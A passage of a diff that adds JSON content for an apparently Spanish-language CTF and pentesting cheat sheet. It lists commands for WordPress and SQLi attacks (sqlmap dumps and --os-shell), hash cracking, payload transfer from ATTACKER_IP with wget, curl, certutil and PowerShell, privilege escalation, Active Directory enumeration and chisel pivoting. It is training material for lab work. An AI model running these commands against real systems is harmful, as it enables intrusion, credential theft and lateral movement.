+            "curl -sS -I $URL/wp-login.php | head",
+            "curl -sS $URL/ | grep -iE \"wp-content|wp-includes\" | head",
+            "wpscan --url $URL --enumerate p,t,u",
+            "wpscan --url $URL --plugins-detection mixed --enumerate ap,at,u",
+            "curl -sS \"$URL/wp-json/wp/v2/users?per_page=100\" | head"
+          ]
+        ],
+        [
+          "bullets",
+          [
+            "Prioriza plugins/temas frente al core si WordPress esta actualizado.",
+            "Revisa uploads, backups de wp-config.php, XML-RPC y REST API.",
+            "Con wp-admin, busca plugins vulnerables, upload/import y roles. En CTF puede haber RCE por theme/plugin editor."
+          ]
+        ],
+        [
+          "table",
+          [
+            [
+              "Hallazgo",
+              "Siguiente paso"
+            ],
+            [
+              "Usuario WP",
+              "Probar password reuse o WPScan brute force moderado si el lab lo permite."
+            ],
+            [
+              "Plugin versionado",
+              "Buscar CVE, exploit-db, WPScan API y PoC legible."
+            ],
+            [
+              "wp-config filtrado",
+              "Extraer DB creds, conectar MySQL, buscar hashes o admin."
+            ],
+            [
+              "Acceso admin",
+              "Subida plugin/theme o funcionalidad vulnerable; documentar vector exacto."
+            ]
+          ],
+          [
+            4.0,
+            12.2
+          ]
+        ]
+      ],
+      "searchText": "WordPress Workflow reducido para cuando detectas WordPress. Confirmar y enumerar curl -sS -I $URL/wp-login.php | head curl -sS $URL/ | grep -iE \"wp-content|wp-includes\" | head wpscan --url $URL --enumerate p,t,u wpscan --url $URL --plugins-detection mixed --enumerate ap,at,u curl -sS \"$URL/wp-json/wp/v2/users?per_page=100\" | head Prioriza plugins/temas frente al core si WordPress esta actualizado. Revisa uploads, backups de wp-config.php, XML-RPC y REST API. Con wp-admin, busca plugins vulnerables, upload/import y roles. En CTF puede haber RCE por theme/plugin editor. Hallazgo Siguiente paso Usuario WP Probar password reuse o WPScan brute force moderado si el lab lo permite. Plugin versionado Buscar CVE, exploit-db, WPScan API y PoC legible. wp-config filtrado Extraer DB creds, conectar MySQL, buscar hashes o admin. Acceso admin Subida plugin/theme o funcionalidad vulnerable; documentar vector exacto."
+    },
+    {
+      "id": "section-08",
+      "order": 8,
+      "slug": "sqli",
+      "title": "SQLi",
+      "summary": "Confirmar, extraer y decidir cuando usar SQLMap.",
+      "phase": "enumeration",
+      "tags": [
+        "web"
+      ],
+      "commands": [
+        "sqlmap -r request.txt --batch",
+        "sqlmap -r request.txt --dbs",
+        "sqlmap -r request.txt -D db -T users --dump",
+        "sqlmap -u \"$URL/page.php?id=1\" --risk 2 --level 3 --batch",
+        "sqlmap -r request.txt --os-shell"
+      ],
+      "tables": [
+        [
+          "Tipo",
+          "Senal"
+        ],
+        [
+          "Error-based",
+          "Errores SQL visibles por comillas, casts o payloads invalidos."
+        ],
+        [
+          "UNION-based",
+          "La respuesta refleja columnas y puedes alinear SELECT/UNION."
+        ],
+        [
+          "Boolean blind",
+          "La respuesta cambia con condiciones true/false."
+        ],
+        [
+          "Time blind",
+          "No ves datos, pero sleep/pg_sleep/waitfor delay modifica tiempos."
+        ],
+        [
+          "Second-order",
+          "El payload se almacena y se ejecuta en otra vista o accion posterior."
+        ]
+      ],
+      "blocks": [
+        [
+          "p",
+          "SQLi se resuelve mejor si primero entiendes el tipo de inyeccion. SQLMap acelera, pero una confirmacion manual evita falsos positivos y ruido."
+        ],
+        [
+          "table",
+          [
+            [
+              "Tipo",
+              "Senal"
+            ],
+            [
+              "Error-based",
+              "Errores SQL visibles por comillas, casts o payloads invalidos."
+            ],
+            [
+              "UNION-based",
+              "La respuesta refleja columnas y puedes alinear SELECT/UNION."
+            ],
+            [
+              "Boolean blind",
+              "La respuesta cambia con condiciones true/false."
+            ],
+            [
+              "Time blind",
+              "No ves datos, pero sleep/pg_sleep/waitfor delay modifica tiempos."
+            ],
+            [
+              "Second-order",
+              "El payload se almacena y se ejecuta en otra vista o accion posterior."
+            ]
+          ],
+          [
+            3.6,
+            12.6
+          ]
+        ],
+        [
+          "h2",
+          "SQLMap practico"
+        ],
+        [
+          "code",
+          [
+            "sqlmap -r request.txt --batch",
+            "sqlmap -r request.txt --dbs",
+            "sqlmap -r request.txt -D db -T users --dump",
+            "sqlmap -u \"$URL/page.php?id=1\" --risk 2 --level 3 --batch",
+            "sqlmap -r request.txt --os-shell"
+          ]
+        ],
+        [
+          "bullets",
+          [
+            "Usa requests de Burp para cookies, headers, POST y auth.",
+            "Sube risk/level solo si la confirmacion basica no basta.",
+            "Si el objetivo es CTF, extrae lo necesario: usuarios, hashes, configs, rutas o RCE."
+          ]
+        ]
+      ],
+      "searchText": "SQLi Confirmar, extraer y decidir cuando usar SQLMap. SQLi se resuelve mejor si primero entiendes el tipo de inyeccion. SQLMap acelera, pero una confirmacion manual evita falsos positivos y ruido. Tipo Senal Error-based Errores SQL visibles por comillas, casts o payloads invalidos. UNION-based La respuesta refleja columnas y puedes alinear SELECT/UNION. Boolean blind La respuesta cambia con condiciones true/false. Time blind No ves datos, pero sleep/pg_sleep/waitfor delay modifica tiempos. Second-order El payload se almacena y se ejecuta en otra vista o accion posterior. SQLMap practico sqlmap -r request.txt --batch sqlmap -r request.txt --dbs sqlmap -r request.txt -D db -T users --dump sqlmap -u \"$URL/page.php?id=1\" --risk 2 --level 3 --batch sqlmap -r request.txt --os-shell Usa requests de Burp para cookies, headers, POST y auth. Sube risk/level solo si la confirmacion basica no basta. Si el objetivo es CTF, extrae lo necesario: usuarios, hashes, configs, rutas o RCE."
+    },
+    {
+      "id": "section-09",
+      "order": 9,
+      "slug": "credenciales-y-loot",
+      "title": "Credenciales y loot",
+      "summary": "Buscar, convertir, crackear y reutilizar sin caos.",
+      "phase": "access",
+      "tags": [
+        "credentials"
+      ],
+      "commands": [
+        "ssh2john id_rsa > id_rsa.hash",
+        "keepass2john vault.kdbx > keepass.hash",
+        "zip2john secret.zip > zip.hash",
+        "office2john doc.docx > office.hash",
+        "john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt",
+        "john --show hash.txt",
+        "hashcat -m 1000 ntlm.hash /usr/share/wordlists/rockyou.txt"
+      ],
+      "tables": [
+        [
+          "Fuente",
+          "Que mirar"
+        ],
+        [
+          "Web root",
+          ".env, config.php, wp-config.php, web.config, appsettings.json."
+        ],
+        [
+          "Homes",
+          ".ssh, history, Desktop, Downloads, backups, notas."
+        ],
+        [
+          "Shares",
+          "Backups, IT, Dev, Deploy, SYSVOL, NETLOGON, scripts."
+        ],
+        [
+          "Windows",
+          "cmdkey, Unattend.xml, PowerShell history, IIS configs."
+        ],
+        [
+          "Linux",
+          "/var/www, /opt, /var/backups, cron scripts, bash history."
+        ]
+      ],
+      "blocks": [
+        [
+          "table",
+          [
+            [
+              "Fuente",
+              "Que mirar"
+            ],
+            [
+              "Web root",
+              ".env, config.php, wp-config.php, web.config, appsettings.json."
+            ],
+            [
+              "Homes",
+              ".ssh, history, Desktop, Downloads, backups, notas."
+            ],
+            [
+              "Shares",
+              "Backups, IT, Dev, Deploy, SYSVOL, NETLOGON, scripts."
+            ],
+            [
+              "Windows",
+              "cmdkey, Unattend.xml, PowerShell history, IIS configs."
+            ],
+            [
+              "Linux",
+              "/var/www, /opt, /var/backups, cron scripts, bash history."
+            ]
+          ],
+          [
+            3.2,
+            13.0
+          ]
+        ],
+        [
+          "h2",
+          "Conversiones frecuentes"
+        ],
+        [
+          "code",
+          [
+            "ssh2john id_rsa > id_rsa.hash",
+            "keepass2john vault.kdbx > keepass.hash",
+            "zip2john secret.zip > zip.hash",
+            "office2john doc.docx > office.hash",
+            "john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt",
+            "john --show hash.txt",
+            "hashcat -m 1000 ntlm.hash /usr/share/wordlists/rockyou.txt"
+          ]
+        ],
+        [
+          "bullets",
+          [
+            "Etiqueta cada credencial por fuente y servicio probado.",
+            "Despues de cada credencial valida, reenumera: shares, sudo, WinRM, DB, panel web, LDAP.",
+            "En AD evita spraying agresivo; usa usuarios reales y una password candidata con control."
+          ]
+        ]
+      ],
+      "searchText": "Credenciales y loot Buscar, convertir, crackear y reutilizar sin caos. Fuente Que mirar Web root .env, config.php, wp-config.php, web.config, appsettings.json. Homes .ssh, history, Desktop, Downloads, backups, notas. Shares Backups, IT, Dev, Deploy, SYSVOL, NETLOGON, scripts. Windows cmdkey, Unattend.xml, PowerShell history, IIS configs. Linux /var/www, /opt, /var/backups, cron scripts, bash history. Conversiones frecuentes ssh2john id_rsa > id_rsa.hash keepass2john vault.kdbx > keepass.hash zip2john secret.zip > zip.hash office2john doc.docx > office.hash john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt john --show hash.txt hashcat -m 1000 ntlm.hash /usr/share/wordlists/rockyou.txt Etiqueta cada credencial por fuente y servicio probado. Despues de cada credencial valida, reenumera: shares, sudo, WinRM, DB, panel web, LDAP. En AD evita spraying agresivo; usa usuarios reales y una password candidata con control."
+    },
+    {
+      "id": "section-10",
+      "order": 10,
+      "slug": "acceso-inicial",
+      "title": "Acceso inicial",
+      "summary": "Convertir un hallazgo en shell estable o login util.",
+      "phase": "access",
+      "tags": [
+        "credentials",
+        "exploit",
+        "linux",
+        "windows"
+      ],
+      "commands": [
+        "python3 -c 'import pty; pty.spawn(\"/bin/bash\")'",
+        "CTRL+Z",
+        "stty raw -echo; fg",
+        "export TERM=xterm",
+        "# Atacante",
+        "python3 -m http.server 8000",
+        "# Linux victima",
+        "wget http://ATTACKER_IP:8000/file -O /tmp/file",
+        "curl http://ATTACKER_IP:8000/file -o /tmp/file",
+        "# Windows victima",
+        "certutil -urlcache -split -f http://ATTACKER_IP:8000/file.exe C:\\Windows\\Temp\\file.exe",
+        "powershell -c \"iwr http://ATTACKER_IP:8000/file.exe -OutFile C:\\Windows\\Temp\\file.exe\""
+      ],
+      "tables": [
+        [
+          "Entrada",
+          "Siguiente paso"
+        ],
+        [
+          "SSH creds/clave",
+          "chmod 600 id_rsa; ssh -i id_rsa user@$IP; ssh2john si tiene passphrase."
+        ],
+        [
+          "RCE web",
+          "Confirmar con id/whoami; despues reverse shell o webshell temporal."
+        ],
+        [
+          "Upload ejecutable",
+          "Validar ruta y ejecucion antes de payload pesado."
+        ],
+        [
+          "WinRM valido",
+          "evil-winrm -i $IP -u USER -p PASS."
+        ],
+        [
+          "SMB escritura",
+          "Buscar ejecucion indirecta: scripts, tareas, servicios, web roots."
+        ]
+      ],
+      "blocks": [
+        [
+          "table",
+          [
+            [
+              "Entrada",
+              "Siguiente paso"
+            ],
+            [
+              "SSH creds/clave",
+              "chmod 600 id_rsa; ssh -i id_rsa user@$IP; ssh2john si tiene passphrase."
+            ],
+            [
+              "RCE web",
+              "Confirmar con id/whoami; despues reverse shell o webshell temporal."
+            ],
+            [
+              "Upload ejecutable",
+              "Validar ruta y ejecucion antes de payload pesado."
+            ],
+            [
+              "WinRM valido",
+              "evil-winrm -i $IP -u USER -p PASS."
+            ],
+            [
+              "SMB escritura",
+              "Buscar ejecucion indirecta: scripts, tareas, servicios, web roots."
+            ]
+          ],
+          [
+            3.2,
+            13.0
+          ]
+        ],
+        [
+          "h2",
+          "Estabilizacion Linux"
+        ],
+        [
+          "code",
+          [
+            "python3 -c 'import pty; pty.spawn(\"/bin/bash\")'",
+            "CTRL+Z",
+            "stty raw -echo; fg",
+            "export TERM=xterm"
+          ]
+        ],
+        [
+          "h2",
+          "Transferencia"
+        ],
+        [
+          "code",
+          [
+            "# Atacante",
+            "python3 -m http.server 8000",
+            "# Linux victima",
+            "wget http://ATTACKER_IP:8000/file -O /tmp/file",
+            "curl http://ATTACKER_IP:8000/file -o /tmp/file",
+            "# Windows victima",
+            "certutil -urlcache -split -f http://ATTACKER_IP:8000/file.exe C:\\Windows\\Temp\\file.exe",
+            "powershell -c \"iwr http://ATTACKER_IP:8000/file.exe -OutFile C:\\Windows\\Temp\\file.exe\""
+          ]
+        ]
+      ],
+      "searchText": "Acceso inicial Convertir un hallazgo en shell estable o login util. Entrada Siguiente paso SSH creds/clave chmod 600 id_rsa; ssh -i id_rsa user@$IP; ssh2john si tiene passphrase. RCE web Confirmar con id/whoami; despues reverse shell o webshell temporal. Upload ejecutable Validar ruta y ejecucion antes de payload pesado. WinRM valido evil-winrm -i $IP -u USER -p PASS. SMB escritura Buscar ejecucion indirecta: scripts, tareas, servicios, web roots. Estabilizacion Linux python3 -c 'import pty; pty.spawn(\"/bin/bash\")' CTRL+Z stty raw -echo; fg export TERM=xterm Transferencia # Atacante python3 -m http.server 8000 # Linux victima wget http://ATTACKER_IP:8000/file -O /tmp/file curl http://ATTACKER_IP:8000/file -o /tmp/file # Windows victima certutil -urlcache -split -f http://ATTACKER_IP:8000/file.exe C:\\Windows\\Temp\\file.exe powershell -c \"iwr http://ATTACKER_IP:8000/file.exe -OutFile C:\\Windows\\Temp\\file.exe\""
+    },
+    {
+      "id": "section-11",
+      "order": 11,
+      "slug": "linux-privesc",
+      "title": "Linux privesc",
+      "summary": "De shell normal a root por permisos, tareas, configs o credenciales.",
+      "phase": "privesc",
+      "tags": [
+        "linux"
+      ],
+      "commands": [
+        "whoami; id; groups; hostname; pwd",
+        "sudo -l",
+        "find / -perm -4000 -type f -ls 2>/dev/null",
+        "getcap -r / 2>/dev/null",
+        "find / -writable -type d 2>/dev/null | grep -vE '^/proc|^/sys|^/dev'",
+        "cat /etc/crontab; ls -la /etc/cron.*",
+        "systemctl list-timers 2>/dev/null"
+      ],
+      "tables": [
+        [
+          "Vector",
+          "Que mirar"
+        ],
+        [
+          "sudo",
+          "NOPASSWD, binarios GTFOBins, scripts como otro usuario, rutas relativas."
+        ],
+        [
+          "SUID/SGID",
+          "bash, find, vim, less, cp, tar, zip, python, perl, nmap, env."
+        ],
+        [
+          "Capabilities",
+          "cap_setuid, cap_dac_read_search, cap_dac_override, cap_sys_admin."
+        ],
+        [
+          "Cron/timers",
+          "Scripts escribibles, PATH inseguro, comodines, backups ejecutados como root."
+        ],
+        [
+          "Credenciales",
+          "Configs, backups, /var/www, .ssh, history, DB dumps."
+        ],
+        [
+          "Contenedores",
+          "docker/lxd/lxc groups, docker.sock, montajes privilegiados."
+        ]
+      ],
+      "blocks": [
+        [
+          "p",
+          "La regla: si puedes modificar algo que otro usuario mas privilegiado ejecuta o lee, tienes un vector potencial."
+        ],
+        [
+          "code",
+          [
+            "whoami; id; groups; hostname; pwd",
+            "sudo -l",
+            "find / -perm -4000 -type f -ls 2>/dev/null",
+            "getcap -r / 2>/dev/null",
+            "find / -writable -type d 2>/dev/null | grep -vE '^/proc|^/sys|^/dev'",
+            "cat /etc/crontab; ls -la /etc/cron.*",
+            "systemctl list-timers 2>/dev/null"
+          ]
+        ],
+        [
+          "table",
+          [
+            [
+              "Vector",
+              "Que mirar"
+            ],
+            [
+              "sudo",
+              "NOPASSWD, binarios GTFOBins, scripts como otro usuario, rutas relativas."
+            ],
+            [
+              "SUID/SGID",
+              "bash, find, vim, less, cp, tar, zip, python, perl, nmap, env."
+            ],
+            [
+              "Capabilities",
+              "cap_setuid, cap_dac_read_search, cap_dac_override, cap_sys_admin."
+            ],
+            [
+              "Cron/timers",
+              "Scripts escribibles, PATH inseguro, comodines, backups ejecutados como root."
+            ],
+            [
+              "Credenciales",
+              "Configs, backups, /var/www, .ssh, history, DB dumps."
+            ],
+            [
+              "Contenedores",
+              "docker/lxd/lxc groups, docker.sock, montajes privilegiados."
+            ]
+          ],
+          [
+            3.2,
+            13.0
+          ]
+        ]
+      ],
+      "searchText": "Linux privesc De shell normal a root por permisos, tareas, configs o credenciales. La regla: si puedes modificar algo que otro usuario mas privilegiado ejecuta o lee, tienes un vector potencial. whoami; id; groups; hostname; pwd sudo -l find / -perm -4000 -type f -ls 2>/dev/null getcap -r / 2>/dev/null find / -writable -type d 2>/dev/null | grep -vE '^/proc|^/sys|^/dev' cat /etc/crontab; ls -la /etc/cron.* systemctl list-timers 2>/dev/null Vector Que mirar sudo NOPASSWD, binarios GTFOBins, scripts como otro usuario, rutas relativas. SUID/SGID bash, find, vim, less, cp, tar, zip, python, perl, nmap, env. Capabilities cap_setuid, cap_dac_read_search, cap_dac_override, cap_sys_admin. Cron/timers Scripts escribibles, PATH inseguro, comodines, backups ejecutados como root. Credenciales Configs, backups, /var/www, .ssh, history, DB dumps. Contenedores docker/lxd/lxc groups, docker.sock, montajes privilegiados."
+    },
+    {
+      "id": "section-12",
+      "order": 12,
+      "slug": "windows-privesc",
+      "title": "Windows privesc",
+      "summary": "Post-exploit Windows fuera de AD.",
+      "phase": "privesc",
+      "tags": [
+        "windows"
+      ],
+      "commands": [
+        "whoami",
+        "whoami /groups",
+        "whoami /priv",
+        "systeminfo",
+        "wmic qfe get Caption,Description,HotFixID,InstalledOn",
+        "sc query state= all",
+        "wmic service get name,displayname,pathname,startmode",
+        "schtasks /query /fo LIST /v",
+        "cmdkey /list"
+      ],
+      "tables": [
+        [
+          "Vector",
+          "Senal"
+        ],
+        [
+          "Servicios debiles",
+          "Puedes cambiar binPath, reiniciar servicio o sustituir ejecutable."
+        ],
+        [
+          "Unquoted service path",
+          "Ruta con espacios sin comillas y directorio intermedio escribible."
+        ],
+        [
+          "AlwaysInstallElevated",
+          "HKCU y HKLM Installer AlwaysInstallElevated a 1."
+        ],
+        [
+          "Tareas programadas",
+          "Script/binario ejecutado por usuario superior en ruta escribible."
+        ],
+        [
+          "SeImpersonatePrivilege",
+          "Potato/PrintSpoofer/RoguePotato segun version y restricciones del lab."
+        ],
+        [
+          "SeBackupPrivilege",
+          "Lectura de archivos protegidos, SAM/SYSTEM o datos sensibles."
+        ],
+        [
+          "Credenciales",
+          "IIS configs, web.config, PowerShell history, Unattend.xml, cmdkey."
+        ]
+      ],
+      "blocks": [
+        [
+          "code",
+          [
+            "whoami",
+            "whoami /groups",
+            "whoami /priv",
+            "systeminfo",
+            "wmic qfe get Caption,Description,HotFixID,InstalledOn",
+            "sc query state= all",
+            "wmic service get name,displayname,pathname,startmode",
+            "schtasks /query /fo LIST /v",
+            "cmdkey /list"
+          ]
+        ],
+        [
+          "table",
+          [
+            [
+              "Vector",
+              "Senal"
+            ],
+            [
+              "Servicios debiles",
+              "Puedes cambiar binPath, reiniciar servicio o sustituir ejecutable."
+            ],
+            [
+              "Unquoted service path",
+              "Ruta con espacios sin comillas y directorio intermedio escribible."
+            ],
+            [
+              "AlwaysInstallElevated",
+              "HKCU y HKLM Installer AlwaysInstallElevated a 1."
+            ],
+            [
+              "Tareas programadas",
+              "Script/binario ejecutado por usuario superior en ruta escribible."
+            ],
+            [
+              "SeImpersonatePrivilege",
+              "Potato/PrintSpoofer/RoguePotato segun version y restricciones del lab."
+            ],
+            [
+              "SeBackupPrivilege",
+              "Lectura de archivos protegidos, SAM/SYSTEM o datos sensibles."
+            ],
+            [
+              "Credenciales",
+              "IIS configs, web.config, PowerShell history, Unattend.xml, cmdkey."
+            ]
+          ],
+          [
+            4.0,
+            12.2
+          ]
+        ]
+      ],
+      "searchText": "Windows privesc Post-exploit Windows fuera de AD. whoami whoami /groups whoami /priv systeminfo wmic qfe get Caption,Description,HotFixID,InstalledOn sc query state= all wmic service get name,displayname,pathname,startmode schtasks /query /fo LIST /v cmdkey /list Vector Senal Servicios debiles Puedes cambiar binPath, reiniciar servicio o sustituir ejecutable. Unquoted service path Ruta con espacios sin comillas y directorio intermedio escribible. AlwaysInstallElevated HKCU y HKLM Installer AlwaysInstallElevated a 1. Tareas programadas Script/binario ejecutado por usuario superior en ruta escribible. SeImpersonatePrivilege Potato/PrintSpoofer/RoguePotato segun version y restricciones del lab. SeBackupPrivilege Lectura de archivos protegidos, SAM/SYSTEM o datos sensibles. Credenciales IIS configs, web.config, PowerShell history, Unattend.xml, cmdkey."
+    },
+    {
+      "id": "section-13",
+      "order": 13,
+      "slug": "active-directory",
+      "title": "Active Directory",
+      "summary": "Workflow de dominio: usuarios, credenciales, Kerberos, BloodHound y movimiento.",
+      "phase": "access",
+      "tags": [
+        "active-directory",
+        "credentials",
+        "windows"
+      ],
+      "commands": [
+        "export DOMAIN=dominio.local",
+        "export DC_HOST=DC01",
+        "export DC_FQDN=dc01.dominio.local",
+        "echo \"$IP $DOMAIN $DC_FQDN $DC_HOST\" | sudo tee -a /etc/hosts",
+        "nmap -sC -sV -Pn -p 53,88,135,139,389,445,464,593,636,3268,3269,3389,5985,5986 $IP",
+        "nxc smb $IP",
+        "smbclient -L //$IP -N",
+        "nxc smb $IP -u 'Guest' -p '' --shares",
+        "nxc smb $IP -u 'Guest' -p '' --rid-brute > rid.txt"
+      ],
+      "tables": [
+        [
+          "Fase",
+          "Objetivo"
+        ],
+        [
+          "Identificar dominio",
+          "DC, FQDN, realm, clock skew y /etc/hosts correcto."
+        ],
+        [
+          "Usuarios reales",
+          "RID brute, LDAP, shares, naming patterns."
+        ],
+        [
+          "Credenciales",
+          "Spraying controlado, usuario=password, leaks en shares."
+        ],
+        [
+          "Reenumerar",
+          "Cada credencial nueva cambia shares, LDAP, WinRM y permisos."
+        ],
+        [
+          "Kerberos",
+          "AS-REP roasting, Kerberoasting, tickets, errores de hora."
+        ],
+        [
+          "BloodHound",
+          "Rutas de ACL, sesiones, grupos, GenericAll/WriteDacl/ForceChangePassword."
+        ],
+        [
+          "Acceso",
+          "WinRM, SMB exec, RDP o movimiento lateral segun permisos."
+        ]
+      ],
+      "blocks": [
+        [
+          "p",
+          "En AD el enfoque cambia: no es solo explotar una maquina, sino transformar identidad y permisos en movimiento."
+        ],
+        [
+          "code",
+          [
+            "export DOMAIN=dominio.local",
+            "export DC_HOST=DC01",
+            "export DC_FQDN=dc01.dominio.local",
+            "echo \"$IP $DOMAIN $DC_FQDN $DC_HOST\" | sudo tee -a /etc/hosts",
+            "nmap -sC -sV -Pn -p 53,88,135,139,389,445,464,593,636,3268,3269,3389,5985,5986 $IP",
+            "nxc smb $IP",
+            "smbclient -L //$IP -N",
+            "nxc smb $IP -u 'Guest' -p '' --shares",
+            "nxc smb $IP -u 'Guest' -p '' --rid-brute > rid.txt"
+          ]
+        ],
+        [
+          "table",
+          [
+            [
+              "Fase",
+              "Objetivo"
+            ],
+            [
+              "Identificar dominio",
+              "DC, FQDN, realm, clock skew y /etc/hosts correcto."
+            ],
+            [
+              "Usuarios reales",
+              "RID brute, LDAP, shares, naming patterns."
+            ],
+            [
+              "Credenciales",
+              "Spraying controlado, usuario=password, leaks en shares."
+            ],
+            [
+              "Reenumerar",
+              "Cada credencial nueva cambia shares, LDAP, WinRM y permisos."
+            ],
+            [
+              "Kerberos",
+              "AS-REP roasting, Kerberoasting, tickets, errores de hora."
+            ],
+            [
+              "BloodHound",
+              "Rutas de ACL, sesiones, grupos, GenericAll/WriteDacl/ForceChangePassword."
+            ],
+            [
+              "Acceso",
+              "WinRM, SMB exec, RDP o movimiento lateral segun permisos."
+            ]
+          ],
+          [
+            3.2,
+            13.0
+          ]
+        ]
+      ],
+      "searchText": "Active Directory Workflow de dominio: usuarios, credenciales, Kerberos, BloodHound y movimiento. En AD el enfoque cambia: no es solo explotar una maquina, sino transformar identidad y permisos en movimiento. export DOMAIN=dominio.local export DC_HOST=DC01 export DC_FQDN=dc01.dominio.local echo \"$IP $DOMAIN $DC_FQDN $DC_HOST\" | sudo tee -a /etc/hosts nmap -sC -sV -Pn -p 53,88,135,139,389,445,464,593,636,3268,3269,3389,5985,5986 $IP nxc smb $IP smbclient -L //$IP -N nxc smb $IP -u 'Guest' -p '' --shares nxc smb $IP -u 'Guest' -p '' --rid-brute > rid.txt Fase Objetivo Identificar dominio DC, FQDN, realm, clock skew y /etc/hosts correcto. Usuarios reales RID brute, LDAP, shares, naming patterns. Credenciales Spraying controlado, usuario=password, leaks en shares. Reenumerar Cada credencial nueva cambia shares, LDAP, WinRM y permisos. Kerberos AS-REP roasting, Kerberoasting, tickets, errores de hora. BloodHound Rutas de ACL, sesiones, grupos, GenericAll/WriteDacl/ForceChangePassword. Acceso WinRM, SMB exec, RDP o movimiento lateral segun permisos."
+    },
+    {
+      "id": "section-14",
+      "order": 14,
+      "slug": "pivoting",
+      "title": "Pivoting",
+      "summary": "Cuando el target ve servicios que tu Kali no ve.",
+      "phase": "pivot",
+      "tags": [
+        "pivoting"
+      ],
+      "commands": [
+        "# SSH local forward",
+        "ssh -L 8080:127.0.0.1:80 user@$IP",
+        "# SOCKS",
+        "ssh -D 1080 -N user@$IP",
+        "proxychains nmap -sT -Pn -p80,445 10.10.20.5",
+        "# Chisel reverse SOCKS",
+        "chisel server -p 8000 --reverse",
+        "./chisel client ATTACKER_IP:8000 R:socks",
+        "# Ligolo: ruta a red interna",
+        "sudo ip route add 10.10.20.0/24 dev ligolo"
+      ],
+      "tables": [
+        [
+          "Situacion",
+          "Tecnica"
+        ],
+        [
+          "Tengo SSH al pivot",
+          "ssh -L para servicio concreto, ssh -D para SOCKS."
+        ],
+        [
+          "No tengo SSH pero ejecuto binarios",
+          "chisel reverse o ligolo-ng."
+        ],
+        [
+          "Necesito escanear varios hosts",
+          "ligolo-ng con interfaz tun y rutas."
+        ],
+        [
+          "Solo necesito una web interna",
+          "Forward local especifico."
+        ],
+        [
+          "Hostnames internos",
+          "Resolver DNS interno o anadir /etc/hosts."
+        ]
+      ],
+      "blocks": [
+        [
+          "table",
+          [
+            [
+              "Situacion",
+              "Tecnica"
+            ],
+            [
+              "Tengo SSH al pivot",
+              "ssh -L para servicio concreto, ssh -D para SOCKS."
+            ],
+            [
+              "No tengo SSH pero ejecuto binarios",
+              "chisel reverse o ligolo-ng."
+            ],
+            [
+              "Necesito escanear varios hosts",
+              "ligolo-ng con interfaz tun y rutas."
+            ],
+            [
+              "Solo necesito una web interna",
+              "Forward local especifico."
+            ],
+            [
+              "Hostnames internos",
+              "Resolver DNS interno o anadir /etc/hosts."
+            ]
+          ],
+          [
+            4.0,
+            12.2
+          ]
+        ],
+        [
+          "code",
+          [
+            "# SSH local forward",
+            "ssh -L 8080:127.0.0.1:80 user@$IP",
+            "# SOCKS",
+            "ssh -D 1080 -N user@$IP",
+            "proxychains nmap -sT -Pn -p80,445 10.10.20.5",
+            "# Chisel reverse SOCKS",
+            "chisel server -p 8000 --reverse",
+            "./chisel client ATTACKER_IP:8000 R:socks",
+            "# Ligolo: ruta a red interna",
+            "sudo ip route add 10.10.20.0/24 dev ligolo"
+          ]
+        ],
+        [
+          "bullets",
+          [
+            "Valida con curl/nc antes de escanear.",
+            "Con proxychains usa -sT, no SYN scan.",
+            "Documenta atacante -> pivot -> red interna -> servicio."
+          ]
+        ]
+      ],
+      "searchText": "Pivoting Cuando el target ve servicios que tu Kali no ve. Situacion Tecnica Tengo SSH al pivot ssh -L para servicio concreto, ssh -D para SOCKS. No tengo SSH pero ejecuto binarios chisel reverse o ligolo-ng. Necesito escanear varios hosts ligolo-ng con interfaz tun y rutas. Solo necesito una web interna Forward local especifico. Hostnames internos Resolver DNS interno o anadir /etc/hosts. # SSH local forward ssh -L 8080:127.0.0.1:80 user@$IP # SOCKS ssh -D 1080 -N user@$IP proxychains nmap -sT -Pn -p80,445 10.10.20.5 # Chisel reverse SOCKS chisel server -p 8000 --reverse ./chisel client ATTACKER_IP:8000 R:socks # Ligolo: ruta a red interna sudo ip route add 10.10.20.0/24 dev ligolo Valida con curl/nc antes de escanear. Con proxychains usa -sT, no SYN scan. Documenta atacante -> pivot -> red interna -> servicio."
+    },
+    {
+      "id": "section-15",
+      "order": 15,
+      "slug": "cve-y-exploits",
+      "title": "CVE y exploits",
+      "summary": "Usar PoCs sin ejecutar basura a ciegas.",
+      "phase": "access",
+      "tags": [
+        "exploit"
+      ],
+      "commands": [
+        "searchsploit PRODUCT VERSION",
+        "sed -n '1,220p' exploit.py",
+        "grep -nEi 'rm|del|format|shutdown|useradd|chmod|curl|wget|socket|subprocess' exploit.py",
+        "python3 exploit.py -h",
+        "python3 exploit.py --check --url $URL"
+      ],
+      "tables": [
+        [
+          "Pregunta",
+          "Decision"
+        ],
+        [
+          "Coincide producto exacto?",
+          "Si no, baja prioridad."
+        ],
+        [
+          "Coincide rango de version?",
+          "Si esta fuera, descarta o busca config concreta."
+        ],
+        [
+          "Requiere credenciales?",
+          "Separar pre-auth de post-auth."
+        ],
+        [
+          "Requiere admin?",
+          "Solo sirve si ya tienes ese rol."
+        ],
+        [
+          "Es destructivo?",
+          "Evitar DoS/wipers salvo que el lab lo pida claramente."
+        ]
+      ],
+      "blocks": [
+        [
+          "table",
+          [
+            [
+              "Pregunta",
+              "Decision"
+            ],
+            [
+              "Coincide producto exacto?",
+              "Si no, baja prioridad."
+            ],
+            [
+              "Coincide rango de version?",
+              "Si esta fuera, descarta o busca config concreta."
+            ],
+            [
+              "Requiere credenciales?",
+              "Separar pre-auth de post-auth."
+            ],
+            [
+              "Requiere admin?",
+              "Solo sirve si ya tienes ese rol."
+            ],
+            [
+              "Es destructivo?",
+              "Evitar DoS/wipers salvo que el lab lo pida claramente."
+            ]
+          ],
+          [
+            4.2,
+            12.0
+          ]
+        ],
+        [
+          "code",
+          [
+            "searchsploit PRODUCT VERSION",
+            "sed -n '1,220p' exploit.py",
+            "grep -nEi 'rm|del|format|shutdown|useradd|chmod|curl|wget|socket|subprocess' exploit.py",
+            "python3 exploit.py -h",
+            "python3 exploit.py --check --url $URL"
+          ]
+        ],
+        [
+          "bullets",
+          [
+            "Primero reproduce la peticion minima con curl/Burp.",
+            "Cambia payloads por comandos inocuos: id, whoami, hostname.",
+            "Guarda fuente, version detectada, cambios hechos y output de exito."
+          ]
+        ]
+      ],
